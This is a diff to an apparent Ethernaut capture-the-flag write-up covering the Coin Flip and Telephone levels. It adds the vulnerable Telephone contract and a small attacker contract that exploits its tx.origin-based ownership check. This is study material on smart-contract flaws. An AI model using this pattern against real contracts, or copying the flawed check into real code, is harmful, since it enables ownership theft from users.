@@ -149,6 +149,9 @@ Calling the above was all that was needed to complete this level.
 <details><summary>The "Coin Flip" Contract</summary>
 
 ```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
 contract CoinFlip {
     uint256 public consecutiveWins;
     uint256 lastHash;
@@ -239,12 +242,28 @@ This is not quite as nice as the TruffleContract interface we have from Ethernau
 We just need to make 10 correct guesses, either from the Remix interface or from the Ethernaut console, and then we have completed the level. Depending on how fast the network is mining new blocks, this might take a few minutes though.
 
 # Level 4: Telephone
-Looking at the code, this is very similar to the previous level, except that all we have to do is make a call via a deployed contract, without needing to calculate any parameters. I quickly built the following contract, using a similar method as in Level 4:
-```
-// SPDX-License-Identifier: GPL-3.0
-pragma solidity >=0.7.0 <0.9.0;
+<details><summary>The "Telephone" Contract</summary>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-contract Level5 {
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+</details>
+
+It seems that everything we need to solve this level we have already learned in the previous level. The only requirement to pass this level is to call the level contract's `changeOwner()` method from our own deployed contract. I deployed the following contract, and calling `makeCall()` completed the level for me.
+```
+contract PhoneCall {
     address private telephoneAddress = [ethernaut's contract address here];
 
     function makeCall() external {
@@ -258,9 +277,7 @@ interface Telephone {
 }
 ```
 
-It was a simple call to this deployed contract's `makeCall()` function that gave me ownership of the `Telephone` contract, completing the level.
-
-> A lesson from this level: don't mix up `msg.sender` and `tx.origin`.
+> A lesson from this level: don't mix up `msg.sender` and `tx.origin`; they're not the same thing.
 
 
 # Level 5: Token
